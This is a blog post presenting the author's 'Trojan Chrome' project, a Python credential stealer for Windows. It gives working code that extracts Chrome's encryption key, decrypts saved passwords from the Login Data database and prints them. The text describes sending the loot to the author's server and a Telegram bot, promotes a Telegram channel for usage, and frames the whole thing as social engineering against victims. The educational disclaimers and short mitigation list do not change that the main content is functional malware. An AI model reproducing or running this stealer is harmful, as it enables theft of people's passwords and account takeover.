---
title: "Trojan Google Chrome🔍"
date: 2025-01-24 12:36:02 +0330
categories: [Learning, Trojan]
tags: [Trojan, Python, Data]
description: "Stealing Google data with Trojan - Telgram Robot - Source Code - Photo"
image: assets/img/c-trojan/img.png
---


# Trojan Chrome: A Detailed Explanation

## ⚡ Overview
This project demonstrates how sensitive user data, such as saved passwords and login information stored in Google Chrome, can be accessed and potentially exploited using a Python-based tool. This type of script is often categorized as a "trojan" due to its malicious intent.

> **Warning:** This explanation is for educational purposes only. Unauthorized access to user data is illegal and unethical.

---

## 📃 How It Works

### Key Components
1. **Extracting Chrome's Secret Key**
   - Chrome encrypts saved passwords using the Windows DPAPI (Data Protection API). The script retrieves the encryption key from Chrome's `Local State` file.

2. **Decrypting Saved Passwords**
   - The script reads the `Login Data` SQLite database in Chrome's user data folder.
   - It decrypts passwords using the extracted secret key and AES decryption.

3. **Sending Data to a Remote Server**
   - After extracting the data, the script uploads it to a remote server via an HTTP POST request.

### Script Workflow
1. Locate Chrome's `Local State` file to fetch the encryption key.
2. Copy the `Login Data` database for analysis.
3. Query the database for saved credentials.
4. Decrypt credentials using the secret key.
5. Send the extracted data to a pre-configured remote server.

---
## 👀 My Trojan Project

### Key Components
 1. The structure of this project is based on social engineering, where the hacker must implement a Trojan on the target system to deceive the victim.
 2. The Trojan finds the victim's data as quickly as possible and converts the person's information, such as websites, emails, and saved passwords, to txt.
 3. Now the data is sent to my server and with the help of HTTP, the data is saved on the server and sent to the Telegram bot I created.
 4. For more information and usage, visit channel <strong></strong> 
  <a href="https://t.me/i2xAm1r" target="_blank">
      <i class="fab fa-telegram"></i> Telegram
### Photo :

<div style="text-align: center; margin: 20px 0;">
    <img src="assets/img/c-trojan/trojan.jpg" alt="Codespaces" width="750" height="200">
</div>
<div style="text-align: center; margin: 20px 0;">
    <img src="assets/img/c-trojan/telegram.png" alt="Codespaces" width="750" height="200">
</div>

---
## 💻 Code Walkthrough

```python
# Import necessary libraries
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import requests

# Define paths to Chrome's files
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])

# Extract the secret key from Local State file
def get_secret_key():
    with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    secret_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return secret_key

# Decrypt saved passwords
def decrypt_password(ciphertext, secret_key):
    iv = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    cipher = AES.new(secret_key, AES.MODE_GCM, iv)
    return cipher.decrypt(encrypted_password).decode()

# Extract and decrypt data
def extract_data():
    secret_key = get_secret_key()
    db_path = os.path.join(CHROME_PATH, "Default", "Login Data")
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for url, username, password in cursor.fetchall():
        decrypted_password = decrypt_password(password, secret_key)
        print(f"URL: {url}, Username: {username}, Password: {decrypted_password}")
    conn.close()
```

---

## ✅ Ethical Considerations
- **Legality**: Accessing someone else’s data without permission is illegal and punishable under various laws.
- **Ethics**: Creating or distributing malicious software is unethical.
- **Responsibility**: This knowledge should only be used to enhance security awareness and protect systems from similar attacks.

---

## ⚙️ Mitigation Techniques
To protect against similar attacks:
1. Use strong and unique passwords for different accounts.
2. Regularly clear your browser’s saved credentials.
3. Enable two-factor authentication (2FA) for added security.
4. Keep your browser and operating system updated.
5. Use trusted antivirus and anti-malware solutions.

---

## 🤝 Disclaimer
This document and its accompanying code are provided for **educational purposes only**. The author is not responsible for any misuse or damage caused by the use of this information.

--- 
## 🔗 Discord
[![Discord server](https://discordapp.com/api/guilds/938143724565835848/embed.png?style=banner3)](https://discord.gg/WtPzSe94)

---



